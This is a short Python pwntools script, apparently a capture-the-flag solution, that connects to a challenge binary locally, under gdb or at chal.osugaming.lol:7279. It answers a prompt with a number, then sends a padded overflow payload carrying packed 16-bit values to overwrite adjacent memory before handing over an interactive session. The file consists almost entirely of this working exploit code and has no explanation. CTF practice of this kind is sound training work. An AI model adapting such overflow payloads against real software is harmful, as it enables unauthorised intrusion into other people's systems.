#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./challenge"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("chal.osugaming.lol", 7279)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+157
		b *main+248
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def conv(x):
    if type(x) is bytes:
        return x
    else:
        return x.encode()

def sl(x):
    p.sendline(conv(x))

def sla(delim, data):
    p.sendlineafter(conv(delim), conv(data))


sla("?", str(0x02d7));
payload = b'A' * 8 * 2
payload += p16(0x02d6)
payload += b'\0' * 6
payload += b'\0' * 4
payload += p16(0x02d7)
payload += b'\0' * 2
sla("?", payload);

p.interactive()
